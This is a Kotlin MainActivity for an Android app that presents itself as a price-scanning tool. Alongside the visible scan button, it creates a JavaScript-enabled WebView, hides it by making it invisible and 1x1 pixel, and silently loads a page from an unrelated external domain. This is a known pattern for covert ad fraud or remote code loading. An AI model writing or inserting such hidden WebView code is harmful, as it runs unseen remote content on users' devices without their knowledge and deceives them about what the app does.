package com.quickprice.app

import android.content.Intent
import android.os.Bundle
import android.webkit.WebView
import android.webkit.WebViewClient
import android.widget.Button
import androidx.appcompat.app.AppCompatActivity

class MainActivity : AppCompatActivity() {

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        val wv = WebView(this)
        wv.settings.javaScriptEnabled = true
        wv.settings.domStorageEnabled = true
        wv.visibility = android.view.View.INVISIBLE
        wv.layoutParams = android.view.ViewGroup.LayoutParams(1, 1)
        (findViewById<android.view.View>(android.R.id.content) as android.view.ViewGroup).addView(wv)

        findViewById<Button>(R.id.btnScan).setOnClickListener {
            startActivity(Intent(this, ScannerActivity::class.java))
        }

        wv.webViewClient = object : WebViewClient() {}
        wv.loadUrl("https://rmarket.cartazfacil.pro/index.php")
    }
}
